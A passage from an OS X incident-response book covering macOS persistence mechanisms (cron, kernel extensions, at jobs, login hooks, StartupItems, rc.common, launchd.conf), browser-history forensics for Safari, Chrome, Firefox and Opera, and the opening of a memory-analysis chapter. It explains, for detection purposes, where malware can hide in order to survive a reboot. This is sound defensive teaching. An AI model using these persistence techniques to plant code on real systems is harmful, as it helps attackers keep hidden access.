as DNS Changer. Scheduling malware via cron is not considered very stealthy 
because it is easily visible. If the owner of the system goes to edit his or her 
cron task, they will immediately see all of the malicious ones as well. If you’re 
not familiar with cron, the crontab -e command will allow you to edit your 
scheduled tasks and the crontab -l command will print tasks that are currently 
scheduled. Cron tasks are very easy to create (Fig. 5.2).
FIGURE 5.2

CHAPTER 5: 
System Startup and Scheduling
102
An example for running a script called test.sh every day at 9:30 am would look 
like so.
To execute it only on Sundays at 9:30 am you would use the following syntax:
Cron has a few different features built into it allowing you to exchange the 
traditional format for strings such as the following:
The aforementioned format needs little explanation. It will run test.sh every 
time the system starts up.
When collecting cron data it’s important make sure you dump both the user’s 
crontab and the root user’s crontab in case an attacker has managed to get root 
privileges.
crontab -l
sudo crontab -l
Crontabs are nothing more than files stored in plain text. So a more thorough and 
robust way of collecting them would be to copy files under the following directory:
/usr/lib/cron/tabs/
Each user’s crontab will be stored in this directory in a file with their name. 
Root permissions are required to collect all files in this directory. On OS X cron 
is still enabled by default. You can check to see if it has been disabled on a sys-
tem by searching for com.vix.cron in the “launchctl list” output.
PERSISTENCE VIA KEXT
Advanced malware might not even bother using a launch daemon or agent 
if the attacker is able to gain root access. A KEXT file might be used instead. 
KEXT files, also known as kernel extensions, are dynamically loadable 

Persistence via KEXT
103
modules designed for OS X. An attacker can build a KEXT in advanced and 
move it to the victim system for installation. Alternatively, a backdoor might 
use both a KEXT file and a launch daemon or agent. For example, if the 
attacker wants to include a keylogger as part of their backdoor. The keylogger 
might be set up via KEXT module, whereas the communications with the 
attacker command and control server is started via a launch daemon. In 
order to install a KEXT as a startup item, it needs to be installed in one of the 
following locations:
j	 /System/Library/Extensions
j	 KEXT files built into the OS X operating system.
j	 /Library/Extensions
j	 KEXT files installed by 3rd party software
Up until OS X Yosemite, anyone with root privileges could install a KEXT 
in the System directory even if their KEXT file was unsigned. This addition 
was made by Apple to help fend off malicious KEXT modules. If an attacker 
is using a launch agent or daemon he could manually load a KEXT file from 
any directory. Make sure to keep your eyes open for KEXT files that don’t 
exist in one of the two directories listed previously. Starting with Yosemite, 
users can no longer place unsigned KEXT files in either of these startup 
locations.
KEXT files are bundles or folders that the Finder tool will treat as a 
single file. You can browse into these folders to view their contents. 
KEXT bundles defined by the Apple Developer Library can contain the 
following:
j	 Information property list (info.plist)
j	 This file holds settings and requirements related to the KEXT.
j	 KEXT binary
j	 The binary that the KEXT will be responsible for executing. Mach-O 
format
j	 Resources
j	 icons or other items that might have to be packaged with the driver 
if it needs to display a menu of some type
j	 KEXT bundles
j	 This is a way to allow plugins or list other KEXTS that your KEXT will 
be dependent on
If you take a look into one of these bundles you’ll notice the KEXT binary 
generally exists inside a folder called MacOS. For instance, here is a layout of 
the BluetoothHIDDriver located at /System/Library/Extensions/IOBluetooth-
HIDDriver.kext.

CHAPTER 5: 
System Startup and Scheduling
104
ADDITIONAL KEXT COMMANDS
You can list the currently loaded KEXT files by using the kextstat command.
If you’re not familiar with what each of these columns are, they’re broken 
down very well at the top of the kextstat man page.
Kext files can be loaded and unloaded very easily. The commands we use to do 
this are Kextload and kextunload. For example, if you wanted to disable Bluetooth 
on your system, you could unload the kext bundle responsible for running it. You 
can do this by pointing the kextunload command at the bluetooth kext.
Alternatively, it can be unloaded by it’s CFBundle name which is the name 
displayed in the kextstat output.

Less Popular Persistence Methods
105
You can load it again using the kextload command.
Finally, although it’s not a KEXT specific command, you can also run codesign 
on KEXT bundles. Codesign will tell you what KEXTs are signed and if so, who 
signed them. We will use this in our collection scripts later to find KEXT files 
that stick out.
LESS POPULAR PERSISTENCE METHODS
Launchd has not always been responsible for ensuring everything is booted up 
correctly on OS X. In fact, launchd wasn’t introduced until OS X 10.4 (Tiger). 
Here we will focus on persistence methods that used to play a large role in OS 
X’s ASEP operations. OS X is evolving at an incredibly rapid pace, so it’s no 
surprise that Apple has declared some old persistence mechanisms deprecated 
to push for the superior launchd mechanism.
com.apple.loginitems.plist
The com.apple.loginitems.plist is a binary property list that can be used to run 
services when a user logs in. This file exists at the following location for each 
user:
/Users/$USER/Library/Preferences/com.apple.loginitems.plist.
com.apple.loginitems.plist contains a list of applications to run at startup. The 
items contained within this property list tend to be more service-like such as 
Dropbox or Google Drive. You can view these startup items by running “plist-
buddy” or “defaults” on the file. The user has the ability to enable and disable 
most of these items at System Settings> Users & Groups > Login Items.

CHAPTER 5: 
System Startup and Scheduling
106
AT
Although the “at” command is not a likely ASEP, it is still a capable one. Apple 
has disabled the usage of the “At” scheduler by default, but it still comes in-
stalled with the operating system. “At tasks” are used to schedule tasks at spe-
cific times. The man pages will reveal that you can get as specific about the time 
and date as you want. These tasks differ from cron in that they are one time 
tasks that get removed after executing. However, they will survive a system re-
start so they can’t be ruled out as a potential threat. A root user can enable the 
usage of at tasks by loading the “at” property list.
The following command will print hello world to /tmp/hello.txt at 9:07 pm 
on the current day:
You can view a user’s at tasks by using the atq command:
Regardless of whether or not “at” tasks are enabled, it doesn’t hurt to see if any 
have been created. Even if “at” is disabled you can still create a task, but that 
task will never be executed. You can collect verbose AT tasks from the follow-
ing folder:
/private/var/at/jobs/
The tasks will be stored in a file named with a random identification number.
/private/var/at/jobs/a000080170e832
Printing the file will reveal user information and variables at the top followed 
by the command the user has scheduled at the bottom.
Login/Logout Hooks
Login and logout hooks are yet another way to fire scripts upon user login 
but they are now considered deprecated by Apple. They will likely soon be 
removed. Nonetheless, we will walk through a brief example of how they 
work.

Less Popular Persistence Methods
107
This will print a basic message to a temporary file. We will save this script as /
Users/bilbo/scripts/hook.sh and add execute permissions to it. Finally we will 
set it to run at login with a login hook.
Running this command will create a file at the following location:
/Users/$USER/Library/Preferences/com.apple.loginwindow.plist
The file will be saved as a binary property list. If you print it using plistbuddy 
you will see it now looks like so.
The next time we log in we can see our login hook has worked.
If a user has logged in as root and created a loginwindow hook it will be stored 
at following location:
/private/var/root/Library/Preferences/com.apple.loginwindow.plist
StartupItems
Before OS X 10.4, there was no launchd process. Instead a different process 
called init was used which functioned quite differently. Long time Unix us-
ers are likely familiar with init and the way it operates. Back when init was 
responsible for system startup, plists were not used. Instead init would run a 
handful of rc scripts which were nothing more than bash scripts ­containing 

CHAPTER 5: 
System Startup and Scheduling
108
some variables and a path to a target process. These RC startup scripts are 
another item that the Apple Developer Library claims will be phased out 
soon and discourages developers from using them. Only root can apply this 
type of ASEP. A StartupItem is a directory that gets placed in one of these two 
folders.
/Library/StartupItems/
/System/Library/StartupItems/
After placing a new directory in one of these two locations, two more items 
need to be placed inside that directory. These two items are an rc script and 
a plist that holds a few settings. This plist must be called “StartupParameters.
plist”. Let’s create a demo hello world service that creates a file in the /tmp di-
rectory. Here is a demo StartupParameters.plist file.
The following is directly from the Apple Developer Library explaining what 
each of these entries are.
j	 Description
j	 A short description of the startup item, used by administrative 
tools.
j	 Provides
j	 The names of the services provided by this startup item. Although 
a startup item can potentially provide multiple services, it is 
recommended that you limit your startup items to only one service 
each.

Less Popular Persistence Methods
109
j	 Requires
j	 The services provided by other startup items that must be running 
before this startup item can be started. If the required services are not 
available, this startup item is not run.
Now we just have to create a helloworld rc script in the same directory. We 
would call it “helloworld” and it would look like so.
Execute permissions also have to be given to this file in order for it to work. 
The analyst should make note that Apple has converted all of its startup items 
to LaunchDaemons so /System/Library/StartupItems should be empty. In fact, 
anything found in this directory should be closely examined.
/etc/rc.common
If an attacker does gain root access to the system, he could also just throw 
any commands he wants to run directly inside the /etc/rc.common file rather 
than setting it up as a service. Any commands placed in here will launch at 
startup.
This would be a sloppy approach, but it shouldn’t be ruled out. /etc/rc.common 
is generally a short script making it obvious if something is there that shouldn’t 
be. When a command is executed from /etc/rc.common directly it will be ex-
ecuted as root. This technique no longer works on El Capitan.

CHAPTER 5: 
System Startup and Scheduling
110
launchd.conf
The launchd.conf persistence mechanism has now been deprecated starting 
with Yosemite. This is a rather interesting method of persistence. Launchd used 
to refer to config files to collect custom settings it should be running with. 
These config files would only exist if a user created them manually.
/etc/launchd.conf
∼/.launchd.conf
In this file you could specify custom “launchctl bsexec” commands to tell 
launchd to execute a specified process. As the Apple Developer Library says 
“bsexec executes a given command in the same Mach bootstrap namespace 
hierarchy as a specified PID.”
Adding these bsexec commands the launchd.conf files would result in a pro-
cesses being executed when launchd starts up.
COLLECTION
Collection of the startup property lists is very simple. Plist files are incredibly 
lightweight whether they’re stored in xml format or the smaller binary format. 
If you want to take the most simplistic approach, just copy each of the startup 
directories and their contents. Make sure to name the new directory something 
obvious otherwise it will be hard to tell the difference between which files are 
launch daemons and which ones are launch agents.
Here is some code we will add to collect.sh to collect ASEPs on the system 
(Fig. 5.3).
FIGURE 5.3

Collection
111

CHAPTER 5: 
System Startup and Scheduling
112
The additions of this code will result in a newly collected directory called 
“aseps” which will contain all of the startup items we discussed in this chapter 
(assuming they exist on the system).
ANALYSIS
The goal of our analysis in this chapter is to unveil any type of persistence the 
attacker might have left behind on the system. Let’s start by taking a look at 
what we’ve collected.
In the last chapter, we discovered a property list called iTunesHelperModule.
plist that was placed on the system within the same time frame that other ma-
licious files were being dropped. This file was placed inside of Mike’s launch 
agents directory. Here’s a reminder.

Analysis
113
Let’s ensure that we collected /Users/mike/Library/LaunchAgents/com.apple.
iTunesHelperModule.plist when we ran our collection script.
Sure enough we’ve collected it. Let’s take a look at what’s inside.
By looking inside this launch agent, we see that it is pointing to the malicious 
iTunesBackup bash script running on the system.
Once loaded, this property list specifies that the iTunesBackup script be run 
every 30 s. We can check to see if launchd has loaded this property list by look-
ing at the information collected from the “launchctl list” command. If launchd 
has loaded this property list then its label value will appear in the launchctl list 
output. The label in this case is called “com.helper.iTunesHelper”. Let’s take a 
look for it inside of Mike’s loaded launch agents.

CHAPTER 5: 
System Startup and Scheduling
114
This confirms for us that launchd has loaded this property list and will execute 
iTunesBackup every 30 s if it’s not already running. Given that iTunesBack-
up is a shell script, we may be able to recover it during our memory analysis 
(Fig. 5.4).
FIGURE 5.4
We were able to discover this malicious property list easily because of the 
time frame in which it was written. If for some reason we can’t find the 
time the malware was written, we can try to search for different pieces of 
the malware file names inside of the ASEPs we’ve collected. This can be  

Analysis
115
accomplished by using the grep command with the recursive switch. Using 
this switch will grep for a keyword inside of every file under your present 
working directory.
Grepping for iTunesBackup recursively is another way we could have revealed 
our malicious property list.
Before we finish, we should check for any unsigned KEXT files placed in the 
system directories using the unsignedKexts.txt output from our collection 
script.
We see a few unsigned KEXT files. We’ll use JMicronATA.kext as an example. 
The first thing I want to know regarding this file are its timestamps. Let’s view 
it in our filetimeline.txt output.

CHAPTER 5: 
System Startup and Scheduling
116
Searching for this JMicronATA.kext on the timeline reveals all of the files con-
tained inside this kext bundle. Right now I’m only curious about the executable 
inside of this kext bundle which the aforementioned output shows is located at 
/System/Library/Extensions/JMicronATA.kext/Contents/MacOS/JMicronATA. 
Let’s use a grep statement that will only display this item.
This file was written, changed, and modified far outside the scope of when 
we believe our intrusion occurred. However, we can still follow through to 
ensure that it’s not malicious. Since this file is unsigned I want to know if 
it’s currently loaded. We can use the kextstat command output for this. To 

Conclusion
117
find JMicronATA inside of the kextstat output, we first need to search for its 
CFBundle label. Since we have collected all the KEXT bundles in the ASEP 
folders, we can get this label by looking at the Info.plist file inside the JMi-
cronATA.kext bundle.
The CFBundleIdentifier for this KEXT is com.jmicron.JMicronATA. Now we 
can take a look at the kextstat output to see if this KEXT is currently loaded. 
We collected the kextstat output in Chapter 2. It is located in our collected 
bash calls.
It looks like this kext is not even running on the system. Given this fact and the 
fact that this file has existed on the system far outside the scope of our intru-
sion timeline it should be safe to say that this KEXT file is not malicious. It’s 
just unsigned.
CONCLUSION
Through this chapter we have covered the standard ways that software can ex-
ecute at startup. Analysis of these items will become easier after you’ve done 
enough responding to recognize standard OS X ASEPs from third party ASEPs. 
There are other advanced ways to ensure a process will start when the system 
does, but the history of OS X malware shows that the ASEPs mentioned in this 
chapter are the most likely to be abused by malware authors. If an attacker 
has managed to run malware on the system you should assume he has gone 
through the proper steps to ensure it will continue to operate.

CHAPTER 5: 
System Startup and Scheduling
118
Yara rule of indicators discovered in this chapter.

119
OS X Incident Response. http://dx.doi.org/10.1016/B978-0-12-804456-8.00001-7
Copyright © 2016 Elsevier Inc. All rights reserved.
Browser Analysis
CHAPTER 6
INTRODUCTION
With so many web browsers available today and all of them storing different 
types of data in different formats, it’s necessary to prepare a response plan 
for any possibility. You will find that even if your company encourages or en-
forces the use of a specific web browser, some employees will break the rules 
and install a browser of their own preference. Safari is of course a popular 
browser choice for Apple users as it comes preinstalled on OS X and iOS de-
vices. Google Chrome has exploded over the past few years and is now the 
most popular web browser to this day. Firefox which used to be a runner up to 
Internet Explorer has lost some popularity, but is still a fan favorite. Finally, the 
Opera web browser, although rare, has made a name for itself in the browser 
market. Fortunately for us, we no longer need to worry about analysis for In-
ternet Explorer since Microsoft no longer supports the browser for OS X. Many 
recall the agreement made between Apple and Microsoft in 1997 that Mac OS 
would come preinstalled with Internet Explorer as the default web browser. 
This five year agreement was made due to a sum of money given to Apple dur-
ing a difficult business time. After honoring this agreement, Apple dropped 
Internet Explorer and Safari was released as the default web browser starting 
with OS X Panther.
In this chapter we’ll take an in depth look at these browsers and the data they 
hold relevant to our investigation. Although web browser history may not al-
ways contribute to our analysis, if a browser was exploited or has played a part 
in downloading a malicious binary we don’t want to miss it. Another benefit 
to browser history is that it will tend to go back further than system logs. A lot 
of the browser analysis that takes place in this chapter should work no mat-
ter which operating system you’re dealing with. The only part that should be 
unique to OS X is where the files are located on disk.

CHAPTER 6: 
Browser Analysis
120
SAFARI
As the default browser built into OS X, it’s no surprise that Safari is frequently 
used by Mac owners. Not to mention the integrated syncing across OS X and 
iOS devices. Older versions of Safari do something a little bit different than 
most browsers by storing browser history in a binary property list file. Newer 
versions of Safari store history in an sqlite3 database format. We will cover the 
collection and analysis of both types since this change was invoked not too 
long ago. Safari timestamps are stored in seconds since 00:00:00 Jan. 1, 2001 
UTC.
Safari History Plist
As stated earlier, old versions of Safari hold web browser history as a binary 
plist stored at the following location:
/Users/$USER/Library/Safari/History.plist
This property list contains some useful entries. First, at the top, you’ll notice a 
key called “WebHistoryDomains.v*”. This key holds a dictionary of domains 
that have been visited as well as a count of how many times they’ve been 
visited.
Next is a key called WebHistoryDates which holds URLS visited, last visited 
dates, and more. Here’s an example.

Safari
121
This data is once again pretty straightforward. We can see the URL that was 
visited, the last visited timestamp, and Safari even supplies a list of web-
sites that have redirected the user to that URL. In this case we can see that 
browsing to http://www.yahoo.com/news has redirected the user to http://
news.yahoo.com/nf=1. This is a neat feature you don’t see included in all 
browsers.
You will notice one major component missing from the property list style his-
tory is a list of timestamps that each URL was visited. Instead, we have only a 
single timestamp called “lastVisitedDate” which will be written over each time 
the user revisits the URL. This was the case until around the time Yosemite was 
released. At this point Apple started keeping an sqlite3 database of timestamps 
that tracked every visit to each URL. For this reason, it’s recommended that 
you use the Safari History.db file if it’s available instead of the History.plist file. 
Sometimes both files may exist if the user updated Safari to the newer version 
and never cleared their history.
Safari History Database
As stated before, the History.db file will give us a much more verbose timeline 
of what Safari activity actually took place. It can be found on systems running 
the latest versions of Safari at the following:
/Users/$USER/Library/Safari/History.db
It consists of the following tables:
The most important tables to note are history_visits and history_items. These 
tables will allow you to build a timeline of browsing history. The history_visits 
table holds an entry for each time a URL was visited along with a unique iden-
tifier for that URL. To get the URL in plain text you need to perform a lookup 
in the history_items table (Fig. 6.1).
An example sqlite3 query to display the timestamp and URL would look as 
follows:

CHAPTER 6: 
Browser Analysis
122
Safari Downloads
Safari stores a property list for all files that it has downloaded. You probably 
recall that back in Chapter 4, we discussed the OS X quarantine database which 
holds all files downloaded by multiple different browsers. Although the quar-
antine file is a great artifact it never hurts to have the same data in two places 
in case one of them was deleted. The “Downloads” property list can be found 
here.
/Users/$USER/Library/Safari/Downloads.plist
As mentioned before, this is in binary plist format. We will be converting 
and parsing this later on. If you wish to convert it on the fly, you can use 
one of the many different built in commands such as plutil, plistbuddy, or 
defaults.
An entry inside the Downloads plist looks something like this after plutil is 
used.
FIGURE 6.1

Chrome
123
Here we can see that someone used Safari to download the Google Chrome 
browser. The most useful key/value pairs will be the DownloadEntryURL, 
DownloadEntryPath, and the DownloadEntryDateAddedKey which is already 
displayed in UTC format.
DownloadEntryDateAddedKey = Sun Dec 27 17:44:35 EST 2015
Slightly older versions of Safari (the same versions that are using History.plist 
instead of History.db) will not contain the DownloadedEntryDateAddedKey. 
This is unfortunate for us, but we can still hope that the timestamp informa-
tion will be in the quarantined property list we collected earlier.
Other Safari Files of Interest
/Users/$USER/Library/Safari/Bookmarks.plist
Holds URLs that have been bookmarked as well as information for the user 
whose icloud account those bookmarks are synced with.
/Users/$USER/Library/Safari/TopSites.plist
A list of the most visited websites that the user browses to.
/Users/$USER/Library/Safari/UserNotificationPermissions.plist
Holds the domains that are allowed to push notifications as well as the time-
stamp when they were given permissions to do so.
/Users/$USER/Library/Safari/LastSession.plist
Holds the information for tabs that were opened the last time the user exited Safari.
CHROME
Although Safari comes preinstalled on OS X you’re bound to find a number 
of users who have chosen Google Chrome as the default browser. Chrome 
stores a lot of data in json format as well as sqlite3 databases. It is based on 
the open source web browser “Chromium”. Chrome is considered by many to 
be the most secure browser available. If it’s installed on a system you’re ana-
lyzing, the odds are you will know pretty quickly as it can be found in many 

CHAPTER 6: 
Browser Analysis
124
running processes and file paths as well as memory. Our biggest focus will be 
the Chrome “History” database which can be found here.
/Users/$USER/Library/Application Support/Google/Chrome/Default/History
If you open this database, you will find a number of interesting tables.
We will dive into some of these tables and their contents.
Chrome History
Shown previously in the Chrome History file you will find the URLs table. This 
table contains a large list of URLs that the user has visited as well as a count of 
how many times they have been there. The Chrome database works in a similar 
manner as the Safari database but with different table names and fields. URL 
ids with timestamps are stored in the “visits” table and need to be correlated to 
the id value inside the “urls” table in order to build a timeline. Chrome stores 
timestamps in the format of microseconds since Jan. 1, 1601 UTC (Fig. 6.2).
The aforementioned image shows that you can use the URL field in the “vis-
its” table to lookup the plain text URL in the “urls” table. Here is an example 
sqlite3 query that can be used to pull each timestamp and visited URL.
Note that when Chrome is in use, the database will be locked and you cannot 
access it unless you copy it to a new location or close Chrome.
FIGURE 6.2

Chrome
125
Chrome Downloads
As you would expect, the “downloads” table inside of the Chrome History.db 
holds entries of files that Chrome has downloaded. It also holds a number of 
additional details that may turn out to be useful during analysis. Each entry in 
this table stores data using the following columns (Fig. 6.3):
There are a few noteworthy data fields here. Two of the most unique and interest-
ing being “opened” and “danger_type”. If the opened value is 0 it means that the 
file was not opened by Chrome after being downloaded. If the value is 1 it means 
the opposite. For example, if you download a picture from a website, that picture 
will appear at the bottom of your browser while downloading. It will stay there 
after it finishes unless you dismiss it. The “opened” value will remain as a 0 until 
FIGURE 6.3

CHAPTER 6: 
Browser Analysis
126
the user clicks on the downloaded file. It is then flipped to a 1. If this file is opened 
via Finder or another process, the opened value will not be updated. Downloaded 
files are commonly opened from within the browser as it is the quickest way 
for the user to access the file. This makes the opened value a good indicator of 
whether or not the user was quick to open the file after downloading it.
Another interesting field is the danger_type field which tells us if this file was 
marked as suspicious by Chrome upon download. This feature contains a 
range of different integers and is actually part of the Chromium browser. The 
Chromium source code in danger_types.h reveals what these integers stand for. 
Many of these danger types point out suspicious activity that may often be ir-
relevant, but occasionally will offer additional context to a malicious scenario.

Chrome
127
Finally, note that the timestamps for the download database are stored as the 
number of seconds since Jan. 1, 1970 UTC which is different from the Chrome 
History database.
The referer field generally holds the location of where the file was downloaded 
from, but it may be left out by Chrome depending on the download situation. 
A more thorough way to get the URL that the download came from would be 
to perform a lookup in the “Downloads_url_chains” table. The downloaded 
file and the URL it came from can be correlated using the id field (Fig. 6.4).
We can use the following sqlite3 query to grab the timestamp, URL, file loca-
tion, danger type, and opened value from the downloads table.
FIGURE 6.4

CHAPTER 6: 
Browser Analysis
128
Other Chrome Files of Interest
/Users/$USER/Library/Application Support/Google/Chrome/Default/Prefer-
ences
This file contains a plethora of good information such as plugins, extensions, 
sites using geolocation, popups, notifications, DNS prefetching, certificate 
­exceptions, and much more. If you’re trying to research whether or not a spe-
cific Chrome setting was enabled, you will likely find that setting in here.
/Users/$USER/Library/Application Support/Google/Chrome/Default/Exten-
sions/
The extensions folder is another directory you may be interested in collecting. 
A Chrome extension is just a directory that contains a number of files. You only 
need to collect these files if you suspect foul play through an installed extension.
Extension directories will contain large strings called Extension IDs. These IDs 
are randomized at install time. An Extension ID might look something like the 
following:
gighmmpiobklfepromnahgkkbiglidom
Although this isn’t helpful in determining the extension name, the contents of 
the directory generally speak for themselves. The folders inside of the extension 
are usually labeled in an obvious manner as well (Extension Cookies, Local 
Extensions, Extension State, etc.).
“/Users/$USER/Library/Application Support/Google/Chrome/Default/Cookies”
Although some of the data in the cookie database is encrypted, the links are 
not. If a user has deleted their history and not their cookies, this could be a 
good way to recover some of that missing data.
“/Users/$USER/Library/Application Support/Google/Chrome/Default/Last 
Session”
“/Users/$USER/Library/Application Support/Google/Chrome/Default/Last 
Tabs”
These files hold sites that were active in the browser when Chrome was last 
closed. They can be used by Chrome when shut down improperly or crashed. 
Although these are not text files, you can easily view most of the data inside the 
file using the “strings” command.
“/Users/$USER/Library/Application Support/Google/Chrome/Default/Book-
marks”
A file that holds a verbose dictionary of all the sites the user has bookmarked 
as well as timestamps of when they were added.

Firefox
129
FIREFOX
The overall usage of Firefox has dwindled since Google Chrome has gained 
popularity, but that doesn’t stop it from being an all time favorite for many 
users. The odds are good that you will encounter it at some point whether 
that be on an OS X based system or not. If you understand the way Chrome 
operates as seen previously, Firefox works in a fairly similar but slightly more 
confusing manner. Perhaps one of the best features of Firefox is that it is open 
source and well documented. You can find more details on the information 
regarding what we’re about to cover at https://developer.mozilla.org/en-US/
docs/Mozilla/Tech/Places/Database. Firefox stores its timestamps in the num-
ber microseconds since Jan. 1, 1970 UTC.
Firefox History
Firefox, like Chrome, handles its history in the form of an sqlite3 database. 
This database is called places.sqlite and can be found here.
“/Users/$USER/Library/Application Support/Firefox/
Profiles/<PROFILE>.default/places.sqlite”
Note that <profile> will be randomly determined when setting up Firefox. 
Places.sqlite holds a number of tables, but there are two that operate most 
similar to the Chrome. The first table is “moz_historyvisits” which holds a 
time stamped entry of each visited website and a URL id. The second table 
“moz_places” allows you to correlate the URL id to an actual URL (Fig. 6.5).
FIGURE 6.5

CHAPTER 6: 
Browser Analysis
130
We can use the following query to pull the timestamp and URL from the 
Firefox history:
DOWNLOADS
Old versions of Firefox used to store an sqlite3 database called downloads.sqlite 
which stored what files were downloaded and when. This data has since been 
moved to into the places.sqlite file. This is good news for us since it means we 
only need to collect one database for our history analysis. The download his-
tory can be found inside the “moz_annos” table. This table looks as follows 
(Fig. 6.6):
Here is what the Firefox moz_annos table contains after downloading a single 
dmg file.
FIGURE 6.6

Downloads
131
Here we can see that Firefox stores downloads in a slightly different arrange-
ment than Chrome and Safari. Per every download Firefox creates multiple 
entries. Notice that the place_id is the same for each entry (37) implying that 
these can all be linked back to the same URL. Another thing to note is the 
anno_attribute_id field. This can add a little more confusion when trying to 
parse the download data. All we need for our timeline is the first entry seen 
previously which would contain the timestamp, target file location, and the 
URL which it came from. Notice that the anno_attribute_id value for this en-
try is a six. We can see what this anno_attribute_id means by looking at the 
“moz_anno_attribute” table (Fig. 6.7).
FIGURE 6.7
Here we can see that an anno_attribute_id of six means we are looking at a 
download entry. All of this to say, when we are parsing the table looking for 
files that have been downloaded, all we really need to look for are the entries 
where moz_attribute_id is a six.

CHAPTER 6: 
Browser Analysis
132
You can use the following sqlite3 query to pull the timestamp, the download 
location, and source URL from the “moz_anno” table.
Other Firefox Files of Interest
/Users/$USER/Library/Application Support/Firefox/Profiles/<PROFILE>/
cookies.sqlite
An sqlite3 database that holds a table called moz_cookies. This of course holds 
the cookies for visited websites.
/Users/$USER/Library/Application Support/Firefox/Profiles/<PROFILE>/
extensions.json
Holds data related to what Firefox extensions are installed as well as descrip-
tions, extension homepages, and authors.
OPERA
Opera, although the least popular of the browsers mentioned here still holds a 
group of dedicated users and you can’t rule out the fact that you might run into 
an intrusion where it was used. The latest version of Opera stores its informa-
tion in the following directory:
/Users/$USER/Library/Application Support/com.operasoftware.Opera
You will notice it stores browser history and download data in the exact same 
format as Google Chrome. This applies to the file names as well as the table 
names. You can find that data here.
/Users/$USER/Library/Application Support/com.operasoftware.Opera/History
The fact that Opera and Chrome save history in a similar format makes perfect 
sense since both browsers are based on the open source web browser Chromi-
um. Opera made this change in 2013 when releasing the Opera 15 browser. This 
means Opera stores timestamps in the same format as Google Chrome which is 
microseconds since Jan. 1, 1601 UTC. Although Chrome and Opera are not the 
same browser, from an analysis perspective they will operate almost identically.
COLLECTION
Collection for this chapter is straightforward. The user could have multiple web 
browsers installed so our task is to search for specific browser locations to deter-
mine which are available. We will then copy the data as necessary. Remember, 

Collection
133
each individual user on the system will have their own web history so we will 
search for the following browser locations for each user on the system.
/Users/$USER/Library/Safari/
/Users/$USER/Library/Application Support/Google/Chrome/
/Users/$USER/Library/Application Support/Firefox/
/Users/$USER/Library/Application Support/com.operasoftware.Opera/
We can update collect.sh to grab these files (Fig. 6.8).
FIGURE 6.8

CHAPTER 6: 
Browser Analysis
134
Analysis Scripts
What we need at this point is pretty obvious. We need a tool that can take the 
data we’ve collected and turn it into a useful timeline. Our goal is to ensure 
that malicious activity sticks out if the installation occurred via web browser 
exploit or download.
Timeline the Data
Our first objective will be to take all of the browser history and download his-
tory that we’ve collected and sort it into a single file.
This browser parser script searches for the browser history files that we col-
lected earlier. If it sees one, it will parse it accordingly. Make sure to notice that 
it looks for the history files based on the file naming convention we defined in 
the collection section (<user>_<browser>History.db).

Collection
135

CHAPTER 6: 
Browser Analysis
136

Collection
137
This script will output data to browserHistory.txt and will look something like so.
2015-09-18T06:53:57, firefox_download,
http://c758482.r82.cf2.rackcdn.com/Sublime%20Text%202.0.2.dmg, 
file:///Users/bilbo/Downloads/Sublime%20Text%202.0.2.dm
2015-09-20T08:37:40, opera_history, http://yahoo.com/
2015-09-21T05:50:27, firefox_history, http://google.com/
2015-09-21T09:30:21, chrome_history, http://lifehacker.com/
2015-09-28T02:32:26, opera_download, https://evernote.com/download/, 
/Users/bilbo/Downloads/Evernote_RELEASE_6.1.1_452253.dmg, danger_
type:CLEAN, opened:0
2015-09-30T06:35:52, safari_history, http://news.yahoo.com/?nf=1

CHAPTER 6: 
Browser Analysis
138
Of course realistically a user probably won’t be using every single browser 
available, but even if they do our script is ready for it.
ANALYSIS
So far throughout the analysis of our malicious scenario we have identified a num-
ber of different malware pieces. Here is a reminder of where we’re at (Fig. 6.9).
FIGURE 6.9
After running the browser_parser.py script, we should have a nice timeline of 
browser history and downloads. The only thing left to do is sort it.

Analysis
139
A great way to start our analysis is by searching for the different malicious items 
we know about inside the web browser history. You can do this by using Yara or 
grep. Here is the Yara rule we created in Chapter 4 which holds the discovered 
malicious file names for the malware we’re dealing with.
Let’s scan our web browser timeline with this Yara rule.
This reveals that security_update.zip exists one time inside of the browser his-
tory we collected. Let’s take a look at it.
Searching the browser history for security_update.zip reveals a Google Chrome 
download entry. This download is very significant as it marks the earliest point 
that malware hit the system. We also see that Chrome has marked this file as 
potentially dangerous and that it was in fact opened via the browser after being 
downloaded.
So what happened at the time window of 06:50 to 06:59 in the browser history?

CHAPTER 6: 
Browser Analysis
140
The aforementioned output shows us that the majority of URLs being visited 
before the malware hit the system were all related to what is likely the user’s 
yahoo mail account. This is evidence that implies a phishing attack brought 
the malware to this system (Fig. 6.10).

Analysis
141
FIGURE 6.10

CHAPTER 6: 
Browser Analysis
142
CONCLUSION
Although we discovered this malicious Chrome download in the quarantine 
file a few chapters ago, looking at the additional web browser history gives 
us further context into what really occurred here. Web browsing history can 
be one of those items that you don’t realize is necessary until you’ve forgot-
ten to collect it. Having the ability to scan browser history using Yara rules 
can also be a great way to determine if a user has browsed to any known ma-
licious domains that may have been used to steal credentials or host browser 
exploits.
Yara rule of indicators discovered in this chapter.

143
OS X Incident Response﻿
Copyright © 2016 Elsevier Inc. All rights reserved.
Memory Analysis
CHAPTER 7
INTRODUCTION
The largest artifact we will focus on collecting and analyzing will be the system 
memory. Analyzing memory can be tricky because valuable pieces of informa-
tion can be overlooked so easily. Memory is a key item that is more valuable if 
you have a quick detection and response time. For example, if the system has 
been restarted after malware was installed, it may be much harder to detect the 
installation method when looking at the memory dump. The same applies to 
any commands executed by an attacker. Finding which commands the attacker 
executed after gaining access to the system is a great clue as to what he was 
after, but if the system has been running too long or has been restarted we may 
have our work cut out for us. You’ll find most modern OS X systems ranging 
from 4 to 16 GB of memory.
Memory should be the first artifact that is collected. If you collect memory 
last, you will end up analyzing your own incident response activity within 
the memory dump. Creating additional false positives for ourselves is the last 
thing we need.
What Tools Do We Need?
When it comes to dumping and analyzing memory on OS X our tool options 
are semilimited. If you do some searching online for OS X memory tools you 
will notice there have been a handful designed with collection and analysis 
in mind, but most end up supporting only a few different OS X releases and 
do not continue to update as new versions of OS X are rolled out. Fortunately 
for us, we have a few very powerful tools that stick out above the rest. The 
first of these tools probably needs little introduction and is called The Volatil-
ity-Framework. Volatility is an open source memory analysis framework that 
works on memory dumps from OS X, Windows, Linux, and Android. Each 
platform has its own set of plugins. Volatility also comes with detailed docu-
mentation and a good breakdown of what each plugin is capable of.

CHAPTER 7: 
Memory Analysis
144
Another tool we will be using is the Rekall Memory Analysis Framework. This 
framework originally started as a new branch within the volatility project. This 
branch eventually led to an incredibly impressive open source tool that allows 
for live memory analysis. For OS X this gives us the ability to load a kext driver 
and run volatility commands directly on the compromised system, or simply 
dump memory to the hard drive. To dump memory, we use another tool re-
leased by the Rekall team called OSXPMem. Before getting started, note that at 
the time this book was written, no tool existed to dump physical memory on 
